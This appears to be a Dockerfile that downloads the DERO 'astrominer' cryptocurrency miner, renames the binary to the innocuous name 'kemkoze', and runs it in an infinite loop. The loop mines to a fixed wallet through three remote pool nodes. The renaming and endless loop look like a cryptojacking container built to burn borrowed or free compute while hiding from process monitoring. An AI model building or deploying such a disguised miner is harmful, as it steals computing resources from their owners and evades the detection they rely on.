FROM ubuntu:latest

# Update packages and install necessary dependencies
RUN apt-get update && apt-get install -y wget tar

# Download and extract the astrominer binary
RUN wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.1/astrominer-V1.9.1.R2_generic_amd64_linux.tar.gz -O kozel.tar.gz \
    && tar xzvf kozel.tar.gz \
    && rm kozel.tar.gz

# Change directory to the astrominer folder
WORKDIR astrominer

# Rename astrominer binary to kemkoze
RUN mv astrominer kemkoze

# Set execute permission for kemkoze binary
RUN chmod +x kemkoze

# Run the astrominer command in an infinite loop
CMD while true; do ./kemkoze -w dero1qyjrpntvr5g7njsg5wh652m42qrzljlnrqljc4xlgdz9d4kj7g9dvqqtcr6xr -r dero-node-yashnik-eu.mysrv.cloud:10300 -r1 dero-node.mysrv.cloud:10300 -r2 dero-node-ch4k1pu.mysrv.cloud:10300 -report-realtime-hashrate; done


